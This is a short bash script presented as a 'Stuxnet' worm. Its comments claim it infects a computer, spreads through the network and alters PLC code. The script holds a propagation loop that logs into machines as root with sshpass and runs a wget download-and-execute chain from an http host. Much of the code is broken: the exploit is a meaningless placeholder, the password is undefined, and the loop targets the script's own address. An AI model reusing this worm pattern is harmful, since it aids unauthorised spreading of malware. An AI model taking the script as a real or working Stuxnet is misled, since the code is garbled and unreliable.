### Stuxnet bash format

#!/bin/bash
# This script will infect any computer it is executed on
# and then propagate to other computers in the network
# It uses a known exploit to gain access and executes
# a custom payload that modifies PLC code

# Gain access to the computer
exploit () {
  echo "Executing exploit against target"
  exploit_code | system
}

# Execute the exploit and infect the host
exploit

# Propagate to other computers
while true; do
  host=$(hostname)
  if [ "$host" != "localhost" ]; then
    ip=$(hostname -i | cut -d" " -f1)
    echo "Spreading to $ip"
    sshpass -p "$password" ssh root@$ip 'sh -c "rm /tmp/stuxnet && wget -O /tmp/stuxnet http://$host:$port/stuxnet && chmod 755 /tmp/stuxnet && /tmp/stuxnet"'
  fi
  sleep 5
done

